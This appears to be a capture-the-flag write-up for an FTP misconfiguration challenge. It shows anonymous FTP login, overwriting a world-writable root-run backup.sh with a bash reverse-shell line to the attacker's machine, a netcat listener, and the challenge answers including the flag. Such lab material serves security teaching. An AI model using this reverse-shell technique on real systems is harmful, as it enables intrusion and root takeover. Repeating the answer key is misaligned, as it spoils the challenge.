# Day 9 challenge
## Anyone can be a santa

This challenge is about FTP and its improper settings.

First we deploy the machine and connect the macihne through ftp as it open on the machine.

We can connect to ftp using

`ftp <IPaddr>`

We can login as anonymous user which has no password.

Now after authnicating with the machine using ftpp have a look at the folder and files that are available on ftp for anonymous user.

We can see that we can access public folder which has santa's movie list and a .sh file

Now lets look at the file permissions.
 
 `ls -al`

We can now see that the backup.sh file is  running on the machine with root privilege and can be written by anyone.

Let download the file by using the command `get`.

`get backup.sh`
`get movielist.txt`

Now lets have a look at the backup.sh file.

`cat backup.sh`

`!/bin/bash
# Created by ElfMcEager to backup all of Santa's goodies!
# Create backups to include date DD/MM/YYYY
filename="backup_`date +%d`_`date +%m`_`date +%Y`.tar.gz";
# Backup FTP folder and store in elfmceager's home directory
tar -zcvf /home/elfmceager/$filename /opt/ftp
# TO-DO: Automate transfer of backups to backup server
`

Now lets add our own part of the script that gets us the reverse tcp connection i.e reverse shell 

under '#To-Do:' add

`bash -i >& /dev/tcp/<IPaddr of your machine>/<Port to listen on> 0>&1`

Now save the backup.sh.

As the permission set on backup.sh was anyone rewrite it so before uploading our modified .sh file we need to set up netcat listner on specified port used in the script

`nc -lvp 4444`

Now we can upload the file using command `put`

`put backup.sh`

Now wait for a 5 seconds or so can see you got the reverse shell back.

Now have look at flag in /root/flag.txt

## Quesitons
 
 1. Name the directory on the FTP server that has data accessible by the "anonymous" user?
 	- Ans: Public

 2. What script gets executed within this directory?
 	- Ans: backup.sh

 3. What movie did Santa have on his Christmas shopping list?
 	- Ans: The Polar Express

 4. Output the contents of /root/flag.txt!
 	- Ans: THM{even_you_can_be_santa}